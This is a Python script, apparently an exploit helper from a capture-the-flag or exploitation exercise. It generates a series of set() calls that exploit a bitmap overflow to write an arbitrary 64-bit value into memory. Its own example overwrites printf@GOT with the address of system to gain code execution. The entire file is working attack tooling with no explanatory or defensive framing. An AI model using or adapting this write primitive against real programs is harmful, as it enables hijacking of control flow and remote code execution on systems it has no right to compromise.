#!/usr/bin/env python3
"""
Generate write code for bitmap overflow
Usage: python3 rce_generate_write_code.py <bit_index> <value>
Example: python3 rce_generate_write_code.py 295488 132509155559248
  (writes system_addr to printf@GOT)
"""

import sys

def generate_write_code(bit_index, value):
    """Generate set() calls for writing a 64-bit value"""
    code = []
    for bit in range(64):
        x = bit_index + bit
        y = 0
        bit_value = (value >> bit) & 1
        code.append(f"set(b1, {x}, {y}, {bit_value});")
    return "\n".join(code)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 rce_generate_write_code.py <bit_index> <value>")
        print("Example: python3 rce_generate_write_code.py 295488 132509155559248")
        print("  (writes system_addr to printf@GOT)")
        sys.exit(1)
    
    bit_index = int(sys.argv[1])
    value = int(sys.argv[2])
    
    print(f"# Writing value 0x{value:x} ({value}) starting at bit_index {bit_index}")
    print()
    print(generate_write_code(bit_index, value))

